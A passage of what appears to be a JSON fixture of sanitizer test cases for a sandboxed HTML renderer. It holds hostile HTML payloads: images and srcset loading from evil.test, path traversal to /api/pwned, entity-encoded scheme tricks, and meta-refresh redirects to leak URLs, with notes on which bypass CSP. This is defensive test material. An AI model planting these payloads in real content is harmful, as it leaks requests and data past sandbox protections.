  {
    "id": "url-protocol-relative",
    "category": "url-schemes",
    "source": "own",
    "html": "<img src=\"//evil.test/x.png\">",
    "notes": "Protocol-relative."
  },
  {
    "id": "url-relative-api",
    "category": "url-schemes",
    "source": "own",
    "html": "<img src=\"/api/pwned?v=url-relative-api\">",
    "notes": "Relative URL to the parent origin API.",
    "rawNetworkLeak": "img-src 'self' admits the whole origin of the content route, /api included (GET without response access; cookies only if not SameSite)"
  },
  {
    "id": "url-asset-lookalike-upper",
    "category": "url-schemes",
    "source": "own",
    "html": "<img src=\"asset:0123456789ABCDEF\">",
    "notes": "Upper-case hex is not a valid asset reference."
  },
  {
    "id": "url-asset-lookalike-suffix",
    "category": "url-schemes",
    "source": "own",
    "html": "<img src=\"asset:0123456789abcdef/../../api/pwned\">",
    "notes": "Asset prefix plus path traversal."
  },
  {
    "id": "url-asset-whitespace",
    "category": "url-schemes",
    "source": "own",
    "html": "<img src=\" asset:0123456789abcdef\">",
    "notes": "Leading whitespace: strict match refuses it."
  },
  {
    "id": "url-asset-entity",
    "category": "url-schemes",
    "source": "own",
    "html": "<img src=\"asset&#58;0123456789abcdef\">",
    "notes": "Entity-encoded colon decodes to a valid ref: allowed (decoded value is what the browser sees)."
  },
  {
    "id": "url-srcset",
    "category": "url-schemes",
    "source": "own",
    "html": "<img src=\"asset:0123456789abcdef\" srcset=\"http://evil.test/x.png 2x\">",
    "notes": "srcset is not allowed."
  },
  {
    "id": "url-meta-refresh",
    "category": "url-schemes",
    "source": "OWASP (own variation)",
    "html": "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.test/leak?v=url-meta-refresh\">",
    "notes": "Meta refresh navigates the content frame itself; not covered by CSP.",
    "rawNetworkLeak": "meta refresh navigates the sandboxed frame; CSP has no navigation directive"
  },
  {
    "id": "url-meta-refresh-api",
    "category": "url-schemes",
    "source": "own",
    "html": "<meta http-equiv=\"refresh\" content=\"0;url=/api/pwned?v=url-meta-refresh-api\">",
    "notes": "Meta refresh to the parent-origin API: a GET navigation the sandbox does not stop.",
    "rawNetworkLeak": "meta refresh navigates the sandboxed frame to a same-origin API URL"
  },
  {
    "id": "url-meta-refresh-javascript",
    "category": "url-schemes",
